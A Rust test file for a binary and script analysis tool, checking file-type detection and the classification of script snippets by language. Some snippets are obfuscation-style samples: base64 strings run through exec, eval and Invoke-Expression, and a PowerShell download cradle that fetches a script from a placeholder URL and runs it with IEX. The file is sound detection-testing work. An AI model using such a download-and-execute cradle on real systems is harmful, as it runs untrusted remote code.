//! Tests for language and file type detection (detect.rs, binary.rs detection functions).

use crate::common::minimal_elf_header;
use stng::script::{ScriptLanguage, detect_script_language};
use stng::{detect_language, is_go_binary, is_rust_binary, is_text_file};

#[test]
fn detects_ascii_as_text() {
    let data = b"Hello, world! This is a plain text file.\n\
                 It has multiple lines and ASCII characters like ABC123.\n\
                 The content is all printable and has no binary markers.";
    assert_eq!(
        detect_language(data),
        stng::Language::Text,
        "ASCII text should be detected as 'text'"
    );
}

#[test]
fn detects_empty_as_unknown() {
    assert_eq!(
        detect_language(&[]),
        stng::Language::Unknown,
        "Empty data should be 'unknown'"
    );
}

#[test]
fn detects_zeros_as_unknown() {
    let data = vec![0u8; 512];
    assert_eq!(
        detect_language(&data),
        stng::Language::Unknown,
        "All-zero bytes should be 'unknown'"
    );
}

#[test]
fn detects_bare_elf_as_unknown() {
    // Minimal ELF without Go or Rust section markers — neither language, but is a binary
    let data = minimal_elf_header();
    assert_eq!(
        detect_language(&data),
        stng::Language::Unknown,
        "ELF without language markers should be 'unknown'"
    );
}

#[test]
fn plain_ascii_is_text() {
    let data =
        b"This is a plain text file.\nWith multiple lines.\nAnd mostly printable ASCII content.";
    assert!(is_text_file(data), "Plain ASCII should be text");
}

#[test]
fn empty_is_not_text() {
    assert!(!is_text_file(&[]), "Empty data is not text");
}

#[test]
fn elf_magic_is_not_text() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0x7f, b'E', b'L', b'F']);
    assert!(
        !is_text_file(&data),
        "ELF magic must be rejected as text even if rest is printable"
    );
}

#[test]
fn macho_64_magic_is_not_text() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0xCF, 0xFA, 0xED, 0xFE]);
    assert!(
        !is_text_file(&data),
        "64-bit Mach-O LE magic must be rejected as text"
    );
}

#[test]
fn macho_32_magic_is_not_text() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0xCE, 0xFA, 0xED, 0xFE]);
    assert!(
        !is_text_file(&data),
        "32-bit Mach-O LE magic must be rejected as text"
    );
}

#[test]
fn fat_macho_magic_is_not_text() {
    let mut data = vec![b'A'; 200];
    data[0..4].copy_from_slice(&[0xCA, 0xFE, 0xBA, 0xBE]);
    assert!(
        !is_text_file(&data),
        "Fat Mach-O magic must be rejected as text"
    );
}

#[test]
fn mz_header_is_not_text() {
    let mut data = vec![b'A'; 200];
    data[0..2].copy_from_slice(b"MZ");
    assert!(
        !is_text_file(&data),
        "PE MZ header must be rejected as text"
    );
}

#[test]
fn mostly_unprintable_is_not_text() {
    // Cycle through all byte values — far below 85% printable
    let data: Vec<u8> = (0u8..=255).cycle().take(256).collect();
    assert!(
        !is_text_file(&data),
        "Data with many non-printable bytes should not be text"
    );
}

#[test]
fn three_nuls_are_not_text() {
    let mut data = vec![b'A'; 200];
    data[10] = 0;
    data[50] = 0;
    data[100] = 0; // third null — exceeds the tolerance of 2
    assert!(
        !is_text_file(&data),
        "Data with more than 2 null bytes should not be text"
    );
}

#[test]
fn two_nuls_are_still_text() {
    // Exactly 2 null bytes within otherwise printable text should still pass
    let mut data = b"This is printable text content for testing null byte tolerance.".to_vec();
    data.extend(
        b"More content to ensure sample size is sufficient for the 85% threshold test.\n".repeat(3),
    );
    data[20] = 0;
    data[40] = 0;
    assert!(
        is_text_file(&data),
        "Data with exactly 2 null bytes should still be considered text if otherwise printable"
    );
}

#[test]
fn bare_elf_is_not_go() {
    let data = minimal_elf_header();
    assert!(
        !is_go_binary(&data),
        "Minimal ELF without .gopclntab or .go.buildinfo should not be Go"
    );
}

#[test]
fn text_is_not_go() {
    let data = b"Just a plain text string with no binary markers at all.";
    assert!(!is_go_binary(data), "Plain text should not be a Go binary");
}

#[test]
fn bare_elf_is_not_rust() {
    let data = minimal_elf_header();
    assert!(
        !is_rust_binary(&data),
        "Minimal ELF without .rustc section should not be Rust"
    );
}

#[test]
fn text_is_not_rust() {
    let data = b"This is not a Rust binary, just text.";
    assert!(
        !is_rust_binary(data),
        "Plain text should not be a Rust binary"
    );
}

#[test]
fn detects_go_binary_as_go() {
    let path = crate::common::path("testdata/elf/hello_linux_amd64");
    let data = std::fs::read(path).expect("Failed to read test binary");
    assert_eq!(
        detect_language(&data),
        stng::Language::Go,
        "hello_linux_amd64 should be detected as 'go' via .gopclntab marker"
    );
}

#[test]
fn go_binary_is_go() {
    let path = crate::common::path("testdata/elf/hello_linux_amd64");
    let data = std::fs::read(path).expect("Failed to read test binary");
    assert!(
        is_go_binary(&data),
        "hello_linux_amd64 should be identified as a Go binary"
    );
}

#[test]
fn go_binary_is_not_rust() {
    let path = crate::common::path("testdata/elf/hello_linux_amd64");
    let data = std::fs::read(path).expect("Failed to read test binary");
    assert!(
        !is_rust_binary(&data),
        "hello_linux_amd64 (Go binary) should not be identified as Rust"
    );
}

#[test]
fn detects_script_languages() {
    let cases = [
        (
            "python imports and defs",
            "import os\nfrom pathlib import Path\n\ndef main():\n    print(Path('ok'))\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "python main guard",
            "#!/usr/bin/env python3\nimport sys\n\nif __name__ == '__main__':\n    print(sys.argv[0])\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "python obfuscation leaning",
            "mod = __import__('base64')\nexec(mod.b64decode('cHJpbnQoMSk='))\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "javascript commonjs",
            "const fs = require('fs');\nfunction main() {\n  console.log(fs.existsSync('ok'));\n}\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "javascript browser style",
            "let value = window.location.href;\ndocument.body.innerHTML = value;\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "javascript obfuscation leaning",
            "var code = atob('YWxlcnQoMSk=');\neval(code);\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "powershell param and env",
            "param($Name)\n$env:TEMP\nWrite-Host $Name\n",
            Some(ScriptLanguage::PowerShell),
        ),
        (
            "powershell encoded style",
            "$data = [Convert]::FromBase64String('QQ==')\nInvoke-Expression ([System.Text.Encoding]::UTF8.GetString($data))\n",
            Some(ScriptLanguage::PowerShell),
        ),
        (
            "powershell webclient style",
            "$wc = New-Object Net.WebClient\n$script = $wc.DownloadString('https://x')\nIEX ($script)\n",
            Some(ScriptLanguage::PowerShell),
        ),
        (
            "lua local function",
            "local function main()\n  print('hello')\nend\nmain()\n",
            None,
        ),
        (
            "lua table iteration",
            "local t = { answer = 42 }\nfor k, v in pairs(t) do\n  print(k, v)\nend\n",
            Some(ScriptLanguage::Lua),
        ),
        (
            "ruby require and puts",
            "require 'json'\ndef main\n  puts JSON.generate(ok: true)\nend\n",
            None,
        ),
        (
            "ruby block style",
            "items = [1, 2, 3]\nitems.each do |n|\n  puts n\nend\n",
            None,
        ),
        (
            "shell posix",
            "#!/bin/sh\nname=world\necho \"$name\"\nif [ -f /tmp/x ]; then\n  exit 0\nfi\n",
            None,
        ),
        (
            "shell bash function",
            "#!/usr/bin/env bash\nmain() {\n  local file=\"$1\"\n  cat \"$file\"\n}\nmain \"$@\"\n",
            None,
        ),
        (
            "shell pipeline",
            "tmp=$(mktemp)\ncat input.txt | sed 's/x/y/' > \"$tmp\"\nrm -f \"$tmp\"\n",
            None,
        ),
    ];

    for (name, src, expected) in cases {
        assert_eq!(
            detect_script_language(src.as_bytes()),
            expected,
            "unexpected detection for {name} sample"
        );
    }
}

#[test]
fn resolves_ambiguous_scripts() {
    let cases = [
        (
            "lua print should not become python",
            "print('hello')\nfor i = 1, 3 do\n  print(i)\nend\n",
            None,
        ),
        (
            "ruby require should not become javascript",
            "require 'openssl'\nputs 'ready'\n",
            None,
        ),
        (
            "shell comments mentioning python should stay shell-like unknown",
            "#!/bin/sh\n# wrapper around python tooling\nprintf '%s\n' 'python helper'\necho done\n",
            None,
        ),
        (
            "javascript eval plus print should stay javascript",
            "const print = console.log;\nlet code = atob('YWxlcnQoMSk=');\neval(code);\n",
            Some(ScriptLanguage::JavaScript),
        ),
        (
            "python exec plus lambda should stay python",
            "import base64\nrunner = lambda s: exec(s)\nrunner(base64.b64decode('cHJpbnQoMSk=').decode())\n",
            Some(ScriptLanguage::Python),
        ),
        (
            "ruby method named eval should not become javascript",
            "def eval(value)\n  puts value\nend\n\neval('hello')\n",
            None,
        ),
        (
            "shell function keyword should not become javascript",
            "#!/bin/bash\nfunction main() {\n  echo hello\n}\nmain\n",
            None,
        ),
        (
            "osascript tell block should stay unsupported",
            "tell application \"Finder\"\n  activate\nend tell\n",
            None,
        ),
        (
            "osascript shell bridge should not become shell or javascript",
            "do shell script \"echo hello\"\ndisplay dialog \"done\"\n",
            None,
        ),
        (
            "powershell with function and echo alias should stay powershell",
            "function Invoke-Task { param($Name) echo $Name }\n$env:TEMP\n",
            Some(ScriptLanguage::PowerShell),
        ),
    ];

    for (name, src, expected) in cases {
        assert_eq!(
            detect_script_language(src.as_bytes()),
            expected,
            "{name} sample resolved unexpectedly"
        );
    }
}
